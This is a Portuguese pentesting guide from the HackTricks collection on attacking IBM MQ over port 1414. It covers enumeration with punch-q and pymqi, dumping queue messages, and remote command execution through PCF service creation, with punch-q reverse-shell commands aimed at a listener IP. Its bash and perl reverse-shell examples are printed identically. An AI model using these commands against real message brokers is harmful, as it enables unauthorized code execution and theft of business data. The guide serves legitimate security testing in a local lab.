# 1414 - Pentesting IBM MQ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informa√ß√µes b√°sicas

IBM MQ √© uma tecnologia da IBM para gerenciar filas de mensagens. Como outras tecnologias de **message broker**, √© dedicada a receber, armazenar, processar e classificar informa√ß√µes entre produtores e consumidores.

Por padr√£o, **ele exp√µe a porta TCP 1414 do IBM MQ**. √Äs vezes, a API REST HTTP pode ser exposta na porta **9443**. M√©tricas (Prometheus) tamb√©m podem ser acessadas pela porta TCP **9157**.

A porta TCP 1414 do IBM MQ pode ser usada para manipular mensagens, filas, canais, ... mas **tamb√©m para controlar a inst√¢ncia**.

A IBM fornece uma ampla documenta√ß√£o t√©cnica dispon√≠vel em [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq).

## Ferramentas

Uma ferramenta sugerida para explora√ß√£o f√°cil √© **[punch-q](https://github.com/sensepost/punch-q)**, com uso de Docker. A ferramenta utiliza ativamente a biblioteca Python `pymqi`.

Para uma abordagem mais manual, use a biblioteca Python **[pymqi](https://github.com/dsuch/pymqi)**. [As depend√™ncias do IBM MQ](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) s√£o necess√°rias.

### Instalando pymqi

**As depend√™ncias do IBM MQ** precisam ser instaladas e carregadas:

1. Crie uma conta (IBMid) em [https://login.ibm.com/](https://login.ibm.com/).
2. Baixe as bibliotecas do IBM MQ em [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc). Para Linux x86_64 √© **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**.
3. Descompacte (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. Execute `sudo ./mqlicense.sh` para aceitar os termos de licen√ßa.

>Se voc√™ estiver usando Kali Linux, modifique o arquivo `mqlicense.sh`: remova/comente as seguintes linhas (entre as linhas 105-110):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. Instale esses pacotes:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. Em seguida, adicione temporariamente os arquivos `.so` ao LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **antes** de executar outras ferramentas que utilizam essas depend√™ncias.

Ent√£o, voc√™ pode clonar o projeto [**pymqi**](https://github.com/dsuch/pymqi): ele cont√©m trechos de c√≥digo interessantes, constantes, ... Ou voc√™ pode instalar a biblioteca diretamente com: `pip install pymqi`.

### Usando punch-q

#### Com Docker

Basta usar: `sudo docker run --rm -ti leonjza/punch-q`.

#### Sem Docker

Clone o projeto [**punch-q**](https://github.com/sensepost/punch-q) e siga o readme para instala√ß√£o (`pip install -r requirements.txt && python3 setup.py install`).

Depois, pode ser usado com o comando `punch-q`.

## Enumera√ß√£o

Voc√™ pode tentar enumerar o **nome do gerenciador de filas, os usu√°rios, os canais e as filas** com **punch-q** ou **pymqi**.

### Gerenciador de Filas

√Äs vezes, n√£o h√° prote√ß√£o contra a obten√ß√£o do nome do Gerenciador de Filas:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Canais

**punch-q** est√° usando uma lista de palavras interna (modific√°vel) para encontrar canais existentes. Exemplo de uso:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
Acontece que algumas inst√¢ncias do IBM MQ aceitam requisi√ß√µes MQ **n√£o autenticadas**, ent√£o `--username / --password` n√£o s√£o necess√°rios. Claro, os direitos de acesso tamb√©m podem variar.

Assim que obtivermos um nome de canal (aqui: `DEV.ADMIN.SVRCONN`), podemos enumerar todos os outros canais.

A enumera√ß√£o pode ser basicamente feita com este trecho de c√≥digo `code/examples/dis_channels.py` do **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... Mas **punch-q** tamb√©m incorpora essa parte (com mais informa√ß√µes!).
Pode ser iniciado com:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Queues

H√° um trecho de c√≥digo com **pymqi** (`dis_queues.py`), mas **punch-q** permite recuperar mais informa√ß√µes sobre as filas:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

Voc√™ pode direcionar fila(s)/canal(is) para espionar / despejar mensagens delas (opera√ß√£o n√£o destrutiva). *Exemplos:*
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**N√£o hesite em iterar sobre todas as filas identificadas.**

### Execu√ß√£o de c√≥digo

> Alguns detalhes antes de continuar: o IBM MQ pode ser controlado de v√°rias maneiras: MQSC, PCF, Comando de Controle. Algumas listas gerais podem ser encontradas na [documenta√ß√£o do IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison).
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Formatos de Comando Program√°veis***) √© no que estamos focados para interagir remotamente com a inst√¢ncia. **punch-q** e, al√©m disso, **pymqi** s√£o baseados em intera√ß√µes PCF.
>
> Voc√™ pode encontrar uma lista de comandos PCF:
> * [Da documenta√ß√£o PCF](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), e
> * [de constantes](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> Um comando interessante √© `MQCMD_CREATE_SERVICE` e sua documenta√ß√£o est√° dispon√≠vel [aqui](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms). Ele aceita como argumento um `StartCommand` apontando para um programa local na inst√¢ncia (exemplo: `/bin/sh`).
>
> H√° tamb√©m um aviso sobre o comando na documenta√ß√£o: *"Aten√ß√£o: Este comando permite que um usu√°rio execute um comando arbitr√°rio com autoridade mqm. Se concedidos direitos para usar este comando, um usu√°rio malicioso ou descuidado poderia definir um servi√ßo que danifica seus sistemas ou dados, por exemplo, excluindo arquivos essenciais."*
>
> *Nota: sempre de acordo com a documenta√ß√£o do IBM MQ (Refer√™ncia de Administra√ß√£o), tamb√©m h√° um endpoint HTTP em `/admin/action/qmgr/{qmgrName}/mqsc` para executar o comando MQSC equivalente para cria√ß√£o de servi√ßo (`DEFINE SERVICE`). Este aspecto ainda n√£o est√° coberto aqui.*

A cria√ß√£o / exclus√£o de servi√ßos com PCF para execu√ß√£o de programas remotos pode ser feita pelo **punch-q**:

**Exemplo 1**
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> Nos logs do IBM MQ, voc√™ pode ler que o comando foi executado com sucesso:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: O Comando '808544aa7fc94c48' foi iniciado. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

Voc√™ tamb√©m pode enumerar os programas existentes na m√°quina (aqui `/bin/doesnotexist` ... n√£o existe):
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**Esteja ciente de que o lan√ßamento do programa √© ass√≠ncrono. Portanto, voc√™ precisa de um segundo item para aproveitar a explora√ß√£o** ***(listener para reverse shell, cria√ß√£o de arquivo em um servi√ßo diferente, exfiltra√ß√£o de dados atrav√©s da rede ...)***

**Exemplo 2**

Para uma reverse shell f√°cil, **punch-q** tamb√©m prop√µe dois payloads de reverse shell:

* Um com bash
* Um com perl

*Claro que voc√™ pode construir um personalizado com o comando `execute`.*

Para bash:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
Para perl:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

Voc√™ pode explorar a documenta√ß√£o do IBM MQ e usar diretamente a biblioteca python **pymqi** para testar comandos PCF espec√≠ficos que n√£o est√£o implementados no **punch-q**.

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
Se voc√™ n√£o conseguir encontrar os nomes constantes, pode consultar a [documenta√ß√£o do IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors).

> *Exemplo para [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (Decimal = 73). Ele precisa do par√¢metro `MQCA_CLUSTER_NAME` (Decimal = 2029) que pode ser `*` (Doc: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Ambiente de teste

Se voc√™ quiser testar o comportamento e as explora√ß√µes do IBM MQ, pode configurar um ambiente local baseado em Docker:

1. Ter uma conta em ibm.com e cloud.ibm.com.
2. Criar um IBM MQ containerizado com:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
Por padr√£o, a autentica√ß√£o est√° habilitada, o nome de usu√°rio √© `admin` e a senha √© `passw0rd` (vari√°vel de ambiente `MQ_ADMIN_PASSWORD`). Aqui, o nome do gerenciador de filas foi definido como `MYQUEUEMGR` (vari√°vel `MQ_QMGR_NAME`).

Voc√™ deve ter o IBM MQ em funcionamento com suas portas expostas:
```bash
‚ùØ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> A vers√£o antiga das imagens do IBM MQ docker est√° em: https://hub.docker.com/r/ibmcom/mq/.

## Refer√™ncias

* [gisto do mgeeky - "Notas Pr√°ticas de Pentesting do IBM MQ"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [Documenta√ß√£o do IBM MQ](https://www.ibm.com/docs/en/ibm-mq)
